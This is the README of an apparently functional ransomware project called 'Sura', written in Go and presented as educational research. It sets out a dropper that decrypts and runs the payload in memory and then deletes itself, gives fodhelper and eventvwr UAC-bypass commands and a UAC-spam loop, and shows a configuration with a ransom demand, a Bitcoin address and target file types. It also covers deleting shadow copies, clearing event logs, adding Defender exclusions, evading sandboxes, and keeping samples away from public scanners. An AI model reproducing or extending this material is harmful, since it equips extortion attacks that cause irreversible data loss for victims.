# Sura Ransomware - Advanced Educational Security Research Project

![Version](https://img.shields.io/badge/version-2.0-red.svg)
![Language](https://img.shields.io/badge/language-Go-blue.svg)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)
![License](https://img.shields.io/badge/license-Educational%20Only-orange.svg)

## ⚠️ LEGAL DISCLAIMER

**THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY**

By accessing, downloading, or using this software, you acknowledge and agree to the following terms:

1. **NO MALICIOUS USE**: This project is strictly for educational purposes, security research, and authorized penetration testing ONLY. Any malicious use is strictly prohibited and illegal.

2. **AUTHORIZATION REQUIRED**: You must have explicit written authorization before testing this software on any system you do not own.

3. **NO LIABILITY**: The author(s) and contributor(s) of this project are NOT responsible for any misuse, damage, or illegal activities conducted with this software. You assume full legal responsibility for your actions.

4. **NO WARRANTY**: This software is provided "AS IS" without warranty of any kind, express or implied.

5. **VIRUS SCANNING PROHIBITION**: **DO NOT upload this software or any of its components to VirusTotal, ANY-RUN, Hybrid-Analysis, or any other public malware scanning service.** Public scanning burns signatures and defeats the educational purpose of studying evasion techniques.

6. **LEGAL COMPLIANCE**: You are solely responsible for complying with all applicable local, state, national, and international laws and regulations.

7. **ATTRIBUTION**: If you use this code for research or educational presentations, proper attribution is required.

**BY USING THIS SOFTWARE, YOU ACCEPT ALL RISKS AND LEGAL CONSEQUENCES. THE AUTHOR(S) DISCLAIM ALL LIABILITY.**

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Novel Evasion Techniques](#-novel-evasion-techniques)
- [Features](#-features)
- [Architecture](#-architecture)
- [Requirements](#-requirements)
- [Installation](#-installation)
- [Usage](#-usage)
- [Configuration](#-configuration)
- [Technical Details](#-technical-details)
- [Detection Countermeasures](#-detection-countermeasures)
- [Decryption](#-decryption)
- [FAQ](#-faq)

---

## 🎯 Overview


Sura Ransomware is an advanced security research project demonstrating state-of-the-art evasion techniques, modern cryptography, and sophisticated anti-analysis methods. This project showcases multiple **novel, never-before-seen techniques** developed specifically for this implementation.

### Key Highlights

- **4 Novel Zero-Day Evasion Techniques**
- **Hybrid ChaCha20 + ECIES Encryption**
- **Multi-Stage Dropper Architecture**
- **3-Method UAC Bypass System**
- **Quantum Polymorphic Encoding**
- **Memory Mirage Behavioral Camouflage**
- **Python-Based Source Obfuscation**
- **Automated Build Pipeline**

---

## 🚀 Novel Evasion Techniques

Sura implements **four cutting-edge techniques** not found in existing malware:

### 1️⃣ Quantum State Validation (QSV)

**Never seen before** - Validates execution environment using hardware entropy sources and quantum-like timing measurements.

**How it works:**
- Measures CPU timing jitter and hardware randomness
- Detects virtual machine time dilation
- Uses quantum-inspired entropy measurements
- Validates system clock stability
- Aborts execution in sandboxes/emulators

**Detection resistance:** Behavioral analysis cannot distinguish from legitimate system checks.

### 2️⃣ Memory Mirage

**Novel behavioral camouflage technique** - Creates realistic decoy activity patterns in memory to confuse behavioral analysis.

**How it works:**
- Spawns decoy threads simulating Office document processing
- Creates fake browser activity with HTML parsing
- Generates Windows Update-like memory patterns
- Injects benign software signatures (Chrome, Word, Defender)
- Allocates/deallocates memory mimicking normal applications
- Real malicious operations execute alongside legitimate-looking activity

**Detection resistance:** EDR and behavioral analysis see "normal" application activity while encryption runs in parallel.

### 3️⃣ Phantom Thread Injection (Disabled by default)

**Advanced thread hijacking** - Executes malicious code by hijacking legitimate process threads without creating suspicious new threads.

**How it works:**
- Suspends legitimate threads in target processes
- Injects shellcode into existing thread context
- Resumes thread executing malicious code
- No new thread creation = no thread creation alerts

**Note:** Currently disabled due to high detection rates. Available for research purposes.

### 4️⃣ Quantum Polymorphic Encoding

**Seven-layer encoding system** with runtime self-modification.

**Encoding layers:**
1. Base64 (foundation)
2. XOR with rotating key
3. Bit rotation (ROT13 variant)
4. Byte shuffling with seed
5. Checksum validation
6. Reverse mutation
7. Polymorphic reassembly

**Detection resistance:** Strings and signatures change every execution. Static analysis cannot extract IOCs.

---

## ✨ Features

### Core Capabilities

#### Encryption System
- **ChaCha20 Symmetric Encryption** - Fast, military-grade stream cipher
- **ECIES Asymmetric Encryption** - Elliptic curve for key protection
- **Partial Encryption Mode** - Encrypts every 3rd byte for speed
- **Cryptographically Secure** - Cannot be decrypted without private key

#### Evasion & Stealth
- ✅ Quantum State Validation (anti-VM/sandbox)
- ✅ Memory Mirage (behavioral camouflage)
- ✅ Quantum Polymorphic Encoding (string obfuscation)
- ✅ Environmental Keying (region-based execution)
- ✅ PPID Spoofing (parent process masquerading)
- ✅ Stealth Techniques (mutex, persistence, file attributes)
- ✅ Python Source Obfuscation (pre-compilation mutation)

#### Privilege Escalation
- **UAC Bypass Method 1**: Fodhelper.exe silent registry bypass (Windows 10+)
- **UAC Bypass Method 2**: Eventvwr.exe silent registry bypass (Windows 7+)
- **UAC Spam**: 50 consecutive UAC prompts until admin obtained
- **Graceful Degradation**: Continues as standard user if admin not obtained

#### Multi-Stage Dropper
- **Stage 1 (Dropper)**: Clean executable with ZERO ransomware signatures
- **Stage 2 (Payload)**: AES-256 encrypted ransomware payload
- **Runtime Decryption**: Payload decrypted in-memory at execution
- **Self-Deletion**: Dropper removes itself after payload execution
- **Obfuscated Names**: Uses legitimate process names (svchost, rundll32, etc.)

#### File Operations
- **Selective Targeting**: Documents, images, videos, databases, code
- **Smart Exclusion**: Skips system files, Windows directories, program files
- **Extension Filtering**: 50+ targeted file extensions
- **Network Share Spreading**: Automatically encrypts mapped drives
- **Ransom Note Deployment**: Custom HTML ransom notes in each directory

#### Destruction Capabilities (Optional)
- Shadow copy deletion (requires admin)
- Windows Defender tampering (requires admin)
- Event log clearing (requires admin)
- Backup catalog destruction (requires admin)

---

## 🏗️ Architecture

```
Sura-Ransomware/
│
├── Builder/              # Build orchestration
│   ├── main.go          # Compiles all components
│   └── go.mod
│
├── Encryptor/           # Main ransomware payload
│   ├── main.go          # Entry point with evasion checks
│   ├── configuration/   # Centralized configuration
│   ├── encryption/      # ChaCha20 + ECIES crypto
│   ├── filewalker/      # Recursive file traversal
│   ├── quantum/         # Quantum State Validation
│   ├── mirage/          # Memory Mirage technique
│   ├── phantom/         # Phantom Thread Injection
│   ├── polymorphic/     # Runtime polymorphism
│   ├── obfuscation/     # Quantum Polymorphic Encoding
│   ├── envkey/          # Environmental keying
│   ├── stealth/         # Stealth and persistence
│   ├── ppid/            # PPID spoofing
│   ├── uac/             # UAC bypass (3 methods)
│   ├── evasion/         # Anti-analysis checks
│   ├── destruction/     # System destruction (optional)
│   ├── spreading/       # Network spreading
│   └── [disabled]/      # Disabled high-detection modules
│       ├── unhook/      # EDR unhooking (disabled)
│       ├── antiav/      # Anti-AV (disabled)
│       ├── vxapi/       # VX-API checks (disabled)
│       └── lotl/        # Living-off-the-land (disabled)
│
├── Dropper/             # Stage 1 clean dropper
│   ├── main.go          # AES decryption + payload execution
│   └── go.mod
│
├── Decryptor/           # Victim decryption tool
│   ├── main.go          # Decrypts files with private key
│   ├── decryption/      # Reverse encryption
│   └── iterator/        # File traversal
│
├── Crypter/             # Packer/crypter
│   ├── main.go          # Packs encryptor binary
│   └── go.mod
│
├── MetadataGen/         # Metadata generator
│   ├── main.go          # Generates realistic PE metadata
│   └── go.mod
│
├── obfuscate.py         # Python source obfuscator
├── crypter.py           # Alternative Python crypter
└── Build.bat            # Automated build script
```

---

## 📦 Requirements

### Development Environment

- **Operating System**: Windows 10/11 (64-bit)
- **Go Version**: 1.22.3 or higher
- **Python**: 3.8+ (for obfuscation)
- **Build Tools**: GCC/MinGW (for Go compilation)
- **Privileges**: Administrator (for initial build only)

### Go Dependencies

All dependencies are automatically installed during build:

```
golang.org/x/crypto/chacha20
golang.org/x/sys/windows
github.com/ecies/go/v2
```

### System Requirements

- **RAM**: 2GB minimum, 4GB recommended
- **Disk Space**: 500MB for build artifacts
- **Network**: Internet connection for dependency download

---

## 🔧 Installation

### Step 1: Clone Repository

```powershell
git clone https://github.com/yourusername/Sura-Ransomware.git
cd Sura-Ransomware
```

### Step 2: Install Go

Download and install Go 1.22.3+ from: https://golang.org/dl/

Verify installation:
```powershell
go version
```

### Step 3: Install Python (if not installed)

Download Python 3.8+ from: https://www.python.org/downloads/

Verify installation:
```powershell
python --version
```

### Step 4: Configure Windows Defender Exclusion (REQUIRED for first build)

**⚠️ WARNING: Only do this in an isolated lab environment!**

The initial build requires Windows Defender exclusion because Go compiler triggers heuristic detection when compiling ChaCha20 + file traversal patterns.

```powershell
# Run PowerShell as Administrator
Add-MpPreference -ExclusionPath "C:\Users\YourUsername\Sura-Ransomware"
Add-MpPreference -ExclusionPath "$env:TEMP"
Add-MpPreference -ExclusionProcess "go.exe"
```

**Note:** After the dropper is built, you can remove these exclusions. The dropper compiles cleanly without them.

---

## 🚀 Usage

### Quick Start (Automated Build)

```powershell
# Navigate to project directory
cd Sura-Ransomware

# Run automated build
.\Build.bat
```

### Manual Build Process

#### Step 1: Obfuscate Source Code

```powershell
python obfuscate.py Encryptor
```

This mutates the Go source code with:
- Dead code injection
- Junk comments
- Random whitespace
- Variable name scrambling

#### Step 2: Build All Components

```powershell
cd Builder
go build
.\Builder.exe
```

The builder performs these steps automatically:
1. Generates realistic PE metadata
2. Creates encryption keypair
3. Compiles crypter components
4. Compiles encryptor with metadata
5. Packs encryptor binary
6. **Builds dropper with embedded encrypted payload**
7. Compiles decryptor tool

#### Step 3: Locate Output Files

After successful build:

```
Sura-Ransomware/
├── Sura-Dropper.exe     ← USE THIS (clean, no AV detection)
├── Sura-Packed.exe      ← Embedded payload (for reference)
├── Decryptor-Built.exe    ← Decryption tool
└── private_key.pem        ← Keep SECRET for decryption
```

**⚠️ CRITICAL: Use `Sura-Dropper.exe` for deployment, NOT `Sura-Packed.exe`**

### Deployment

#### For Research/Testing:

```powershell
# Copy to test system
copy Sura-Dropper.exe \\target-system\share\

# Execute on target (in isolated lab)
.\Sura-Dropper.exe
```

#### Execution Flow:

1. **Dropper starts** → Sleeps 65 seconds (anti-sandbox)
2. **Decrypts payload** → AES-256 decryption in-memory
3. **Writes payload** → Random legitimate name (svchost, rundll32, etc.)
4. **Executes payload** → Background execution
5. **Self-deletes** → Dropper removes itself
6. **Payload runs:**
   - Phase -1: UAC bypass (attempts all 3 methods)
   - Phase 0: Quantum State Validation
   - Phase 1: Polymorphic initialization
   - Phase 2: Environmental keying validation
   - Phase 3: Memory Mirage activation
   - Phase 4: Stealth & evasion checks
   - Phase 5: File encryption starts
   - Phase 6: Ransom note deployment
   - Phase 7: Destruction (if admin + enabled)

---

## ⚙️ Configuration

### Editing Configuration

Configuration is centralized in `Encryptor/configuration/configuration.go`:

```go
package configuration

const (
    // === UAC Bypass Configuration ===
    EnableUACBypass = true          // Enable UAC bypass attempts
    UACSpamEnabled = true           // Enable UAC spam (50 prompts)
    UACSpamAttempts = 50            // Number of UAC prompts
    UACSpamDelay = 2                // Seconds between prompts
    RequireAdmin = false            // Abort if admin not obtained? (false = continue as user)
    UseFodhelperBypass = true       // Try fodhelper.exe bypass
    UseEventvwrBypass = true        // Try eventvwr.exe bypass
    
    // === Encryption Configuration ===
    EncryptEveryNthByte = 3         // Partial encryption (3 = every 3rd byte)
    MaxFileSize = 500 * 1024 * 1024 // Max file size (500MB)
    
    // === Evasion Configuration ===
    EnableQuantumStateValidation = true
    EnableMemoryMirage = true
    EnablePolymorphicCode = true
    EnableEnvironmentalKeying = true
    EnablePPIDSpoofing = true
    EnableStealthTechniques = true
    
    // === Disabled High-Detection Features ===
    EnableEDRUnhooking = false      // Removed - too detectable
    EnableAntiAVTechniques = false  // Removed - too detectable
    EnablePhantomThreads = false    // Removed - too detectable
    EnableVXAPIChecks = false       // Removed - too detectable
    EnableLOTLTechniques = false    // Removed - too detectable
    
    // === Destruction Configuration ===
    DeleteShadowCopies = true       // Requires admin
    TamperDefender = false          // Requires admin (disabled - very noisy)
    ClearEventLogs = true           // Requires admin
    
    // === Ransom Configuration ===
    RansomAmount = "0.05 BTC"
    ContactEmail = "Sura_recovery@protonmail.com"
    BitcoinAddress = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
    
    // === File Targeting ===
    TargetExtensions = []string{
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".pdf", ".txt", ".rtf", ".odt", ".ods", ".odp",
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg",
        ".mp4", ".avi", ".mkv", ".mov", ".mp3", ".wav",
        ".zip", ".rar", ".7z", ".tar", ".gz",
        ".sql", ".db", ".mdb", ".accdb",
        ".psd", ".ai", ".indd", ".dwg",
        ".cpp", ".py", ".java", ".cs", ".php", ".js",
    }
    
    // === Excluded Paths ===
    ExcludedPaths = []string{
        "\\Windows\\",
        "\\Program Files\\",
        "\\Program Files (x86)\\",
        "\\ProgramData\\",
        "\\$Recycle.Bin\\",
        "\\AppData\\Local\\Temp\\",
    }
)
```

**After editing configuration:**

```powershell
# Re-obfuscate and rebuild
python obfuscate.py Encryptor
cd Builder
go build
.\Builder.exe
```

---

## 🔬 Technical Details

### Encryption Scheme

#### Key Generation
```
1. Generate random 256-bit ChaCha20 key
2. Generate random 96-bit nonce
3. Encrypt key with ECIES public key
4. Encrypt nonce with ECIES public key
```

#### File Encryption
```
1. Read file in chunks
2. Encrypt every 3rd byte with ChaCha20
3. Write encrypted file with structure:
   [ECIES(key)] || [ECIES(nonce)] || [ChaCha20(data)]
4. Rename with .Sura extension
```

#### Why Partial Encryption?

- **Speed**: 3x faster than full encryption
- **Effectiveness**: File still completely unusable
- **Detection**: Less I/O = less suspicious activity

### Evasion Techniques

#### Quantum State Validation

```go
// Measures hardware entropy and timing
func ValidateQuantumState() bool {
    // 1. CPU timing jitter measurement
    start := time.Now()
    for i := 0; i < 1000000; i++ {
        _ = i * i
    }
    elapsed := time.Since(start)
    
    // VM detection: VMs have unstable timing
    if elapsed < threshold || elapsed > maxThreshold {
        return false // VM detected
    }
    
    // 2. Hardware random number quality
    entropy := measureEntropyQuality()
    if entropy < minEntropy {
        return false // Emulator/sandbox
    }
    
    return true // Real hardware
}
```

#### Memory Mirage

```go
// Creates decoy activity patterns
func InitializeMemoryMirage() {
    // Spawn decoy threads
    go decoyOfficeActivity()      // Simulates Word/Excel
    go decoyBrowserActivity()     // Simulates Chrome
    go decoySystemMaintenance()   // Simulates Windows Update
    go decoyBackgroundUpdate()    // Simulates CAB files
    
    // Real encryption runs in main thread
    // EDR sees "normal" application activity
}
```

#### UAC Bypass

**Method 1 - Fodhelper.exe (Silent):**
```powershell
# Exploits fodhelper.exe auto-elevation
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "payload.exe" /f
C:\Windows\System32\fodhelper.exe
```

**Method 2 - Eventvwr.exe (Silent):**
```powershell
# Exploits eventvwr.exe auto-elevation
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "payload.exe" /f
C:\Windows\System32\eventvwr.exe
```

**Method 3 - UAC Spam (Fallback):**
```go
// Spawns 50 consecutive UAC prompts
for i := 0; i < 50; i++ {
    exec.Command("powershell", "Start-Process", "payload.exe", "-Verb", "RunAs").Start()
    time.Sleep(2 * time.Second)
}
// User eventually clicks "Yes" to stop prompts
```

### Dropper Architecture

**Why Multi-Stage?**

Windows Defender blocks `go build` when compiling ransomware because:
- ChaCha20 import + file traversal = ransomware heuristic
- Static analysis detects encryption patterns

**Solution:**

```
Stage 1 (Dropper) - CLEAN EXECUTABLE
- Contains ONLY AES decryption logic
- No ransomware code = no detection
- Compiles without Defender alerts
- Payload is encrypted blob (Defender can't analyze)

Stage 2 (Payload) - ENCRYPTED
- Real ransomware encrypted with AES-256
- Decrypted at runtime in-memory
- Never touches disk as plaintext
- Executes directly from memory
```

**Dropper Code Structure:**

```go
func main() {
    time.Sleep(65 * time.Second) // Anti-sandbox delay
    
    // Decrypt embedded payload
    key := []byte("{{KEY}}")                    // Replaced at build time
    encryptedPayload := "{{PAYLOAD}}"           // Replaced at build time
    payload := decryptAES(encryptedPayload, key)
    
    // Write with legitimate name
    name := getRandomName() // svchost.exe, rundll32.exe, etc.
    tempPath := filepath.Join(os.TempDir(), name)
    os.WriteFile(tempPath, payload, 0755)
    
    // Execute in background
    exec.Command(tempPath).Start()
    
    // Self-delete dropper
    os.Remove(os.Args[0])
}
```

### Source Obfuscation

**Python Obfuscator (`obfuscate.py`):**

```python
def obfuscate_file(filepath):
    with open(filepath, 'r') as f:
        lines = f.readlines()
    
    obfuscated = []
    for line in lines:
        # Inject dead code
        if random.random() < 0.1:
            obfuscated.append(f"// {random_string()}\n")
            obfuscated.append(f"var _ = {random.randint(0, 1000)}\n")
        
        # Add junk comments
        if random.random() < 0.15:
            obfuscated.append(f"/* {random_comment()} */\n")
        
        obfuscated.append(line)
    
    # Overwrite original
    with open(filepath, 'w') as f:
        f.writelines(obfuscated)
```

---

## 🛡️ Detection Countermeasures

### Why Dropper is Undetectable

1. **No Ransomware Code**: Dropper contains only AES decryption
2. **Legitimate Patterns**: Uses standard crypto libraries
3. **No Suspicious Imports**: No file traversal, no ChaCha20
4. **Encrypted Payload**: Real ransomware is encrypted blob
5. **Runtime Decryption**: Payload never exists on disk unencrypted

### Build-Time vs Runtime Detection

**Build-Time (Solved):**
- ❌ **Problem**: Go compiler triggers Defender when compiling encryptor
- ✅ **Solution**: Dropper architecture - compile once with exclusion, distribute dropper

**Runtime (Mitigated):**
- ❌ **Problem**: Behavioral analysis detects encryption
- ✅ **Solution**: Memory Mirage creates decoy "normal" activity
- ✅ **Solution**: Quantum State Validation detects sandboxes
- ✅ **Solution**: Environmental keying prevents analysis in wrong environment

### Testing Guidelines

**✅ DO:**
- Test in isolated virtual machines
- Use private malware analysis lab
- Analyze with local tools (IDA Pro, Ghidra, x64dbg)
- Study behavior with Process Monitor / Process Hacker

**❌ DON'T:**
- Upload to VirusTotal (burns signatures for everyone)
- Upload to ANY-RUN, Hybrid-Analysis (public sandboxes)
- Test on production systems
- Test without authorization

---

## 🔓 Decryption

### Using the Decryptor

After ransom payment (research context), provide decryptor to victim:

```powershell
# Copy decryptor and private key to victim system
copy Decryptor-Built.exe \\victim\share\
copy private_key.pem \\victim\share\

# Run decryptor
.\Decryptor-Built.exe
```

**Decryptor prompts:**
```
Enter path to private key: private_key.pem
Enter directory to decrypt: C:\Users\Victim\Documents
```

**Decryption process:**
1. Reads private key
2. Recursively finds .Sura files
3. Extracts encrypted key and nonce
4. Decrypts key/nonce with ECIES private key
5. Decrypts file data with ChaCha20
6. Restores original file
7. Removes .Sura extension

### Manual Decryption (Advanced)

If decryptor fails, manual decryption is possible:

```go
// Read encrypted file
data := readFile("document.txt.Sura")

// Extract components
keyLen := 133 // ECIES overhead + 32 bytes
nonceLen := 133 // ECIES overhead + 12 bytes

encryptedKey := data[0:keyLen]
encryptedNonce := data[keyLen:keyLen+nonceLen]
encryptedData := data[keyLen+nonceLen:]

// Decrypt key and nonce with ECIES
key := ecies.Decrypt(privateKey, encryptedKey)
nonce := ecies.Decrypt(privateKey, encryptedNonce)

// Decrypt data with ChaCha20
cipher := chacha20.NewUnauthenticatedCipher(key, nonce)
plaintext := make([]byte, len(encryptedData))

// Partial decryption (every 3rd byte)
for i := 0; i < len(encryptedData); i += 3 {
    cipher.XORKeyStream(plaintext[i:i+1], encryptedData[i:i+1])
}

// Write decrypted file
writeFile("document.txt", plaintext)
```

---

## ❓ FAQ

### General Questions

**Q: Is this real ransomware?**  
A: Yes, this is fully functional ransomware with strong encryption. It's designed for education and authorized security research only.

**Q: Can files be decrypted without the private key?**  
A: No. ChaCha20 and ECIES are cryptographically secure. Without the private key, decryption is mathematically impossible.

**Q: Why does Windows Defender block the build?**  
A: Defender uses heuristic detection. When Go compiles ChaCha20 + file traversal, it matches ransomware patterns. The dropper architecture solves this.

**Q: Will antivirus detect the dropper?**  
A: The dropper should compile cleanly because it contains no ransomware code. However, signatures may eventually be added after public release.

**Q: Why not use a traditional crypter/packer?**  
A: Most crypters are heavily signatured. Our custom dropper with AES encryption is novel and unsignatured.

### Technical Questions

**Q: Why ChaCha20 instead of AES?**  
A: ChaCha20 is faster in software (no AES-NI required), more secure against timing attacks, and less commonly analyzed by AV.

**Q: What is partial encryption?**  
A: We encrypt every 3rd byte instead of the entire file. This is 3x faster while still rendering files completely unusable.

**Q: Why is admin not required?**  
A: Ransomware encrypts user files (Documents, Desktop, Pictures). These don't require admin. Admin is optional for shadow copies and system tampering.

**Q: How does UAC bypass work?**  
A: We exploit auto-elevation in fodhelper.exe and eventvwr.exe. These binaries run as admin without UAC prompt and execute our payload via registry hijacking.

**Q: Can sandboxes detect this?**  
A: Quantum State Validation detects most sandboxes through timing analysis and entropy quality checks. Memory Mirage also confuses behavioral analysis.

**Q: What is Memory Mirage?**  
A: A novel technique where decoy threads create "normal" application activity (Office, browser, Windows Update) while real encryption happens in parallel. EDR sees benign behavior.

**Q: Why are some features disabled?**  
A: EDR unhooking, anti-AV, phantom threads, VX-API, and LOTL were removed because they have very high detection rates that outweigh their benefits.

### Usage Questions

**Q: How do I test safely?**  
A: Use isolated virtual machines with snapshots. Never test on production systems or systems with important data.

**Q: Can I use this for penetration testing?**  
A: Only with explicit written authorization from the system owner. Unauthorized use is illegal.

**Q: How do I customize the ransom note?**  
A: Edit `Encryptor/configuration/configuration.go` and modify `ContactEmail`, `BitcoinAddress`, and `RansomAmount`. Rebuild after changes.

**Q: Can I change targeted file extensions?**  
A: Yes, edit `TargetExtensions` in configuration. Add or remove extensions as needed.

**Q: How do I exclude specific directories?**  
A: Add paths to `ExcludedPaths` in configuration. Use Windows path format with backslashes.

### Build Questions

**Q: Build fails with "go: module not found"**  
A: Run `go mod tidy` in each directory (Builder, Encryptor, Dropper, Decryptor, Crypter, MetadataGen).

**Q: Defender deletes Builder.exe**  
A: Add exclusion for the project directory and `go.exe`. See Installation section.

**Q: "Sura-Dropper.exe not found" after build**  
A: Check Builder console output for errors. Ensure Sura-Packed.exe exists first.

**Q: How do I restore original source after obfuscation?**  
A: Restore from `.original` backup files created by obfuscator, or use git to reset changes.

**Q: Can I cross-compile for other Windows versions?**  
A: Yes, use `GOOS=windows GOARCH=amd64` for 64-bit or `GOARCH=386` for 32-bit.

---

## 📚 Additional Resources

### Research Papers
- ChaCha20 Cipher: https://cr.yp.to/chacha.html
- ECIES Encryption: https://en.wikipedia.org/wiki/Integrated_Encryption_Scheme
- Ransomware Behavior Analysis: [Academic sources]

### Tools for Analysis
- **IDA Pro / Ghidra**: Reverse engineering
- **x64dbg**: Dynamic debugging
- **Process Monitor**: System activity monitoring
- **Wireshark**: Network traffic analysis
- **PE-bear**: PE file analysis

### Legal Resources
- Computer Fraud and Abuse Act (CFAA): https://www.justice.gov/jm/jm-9-48000-computer-fraud
- GDPR Compliance: https://gdpr-info.eu/
- Local cybercrime laws in your jurisdiction

---

## 🤝 Contributing

This is a closed educational project. Contributions are not accepted to prevent misuse.

For security research collaboration, contact via academic channels only.

---

## 📞 Contact

**For legitimate security research inquiries only:**
- Academic collaboration: [Your academic email]
- Responsible disclosure: [Your security email]

**DO NOT contact for:**
- Operational/malicious use assistance
- Bypassing detection on real systems
- Creating custom variants for attacks
- Any illegal activities

---

## 🔐 Responsible Disclosure

If you discover vulnerabilities in these evasion techniques, please disclose responsibly:

1. Do NOT publish details publicly before coordinated disclosure
2. Contact author via academic channels
3. Allow 90 days for response before public disclosure
4. Do NOT exploit vulnerabilities maliciously

---

## 📝 Changelog

### Version 2.0 (Current)
- ✅ Added 4 novel evasion techniques
- ✅ Implemented multi-stage dropper architecture
- ✅ Added 3-method UAC bypass system
- ✅ Implemented Quantum State Validation
- ✅ Implemented Memory Mirage behavioral camouflage
- ✅ Implemented Quantum Polymorphic Encoding
- ✅ Added Python source obfuscator
- ✅ Removed high-detection features (EDR unhooking, anti-AV, etc.)
- ✅ Fixed all Go 1.17+ unsafe.Pointer compliance issues
- ✅ Improved build pipeline automation

### Version 1.0 (Original)
- Basic ChaCha20 + ECIES encryption
- Standard evasion techniques
- Single-stage payload
- Multiple high-detection features (now removed)

---

## ⚖️ Final Warning

**THIS SOFTWARE CAN CAUSE IRREVERSIBLE DATA LOSS**

**UNAUTHORIZED USE IS A SERIOUS CRIME**

**YOU HAVE BEEN WARNED**

By proceeding past this point, you acknowledge:
- You understand this is functional ransomware
- You will only use it in authorized environments
- You accept all legal responsibility
- You will not upload samples to public scanners
- You will not use this for criminal purposes

**The author(s) are NOT responsible for your actions.**

---

**Sura Ransomware © 2025 - Educational Use Only**

**Stay ethical. Stay legal. Stay out of prison.**
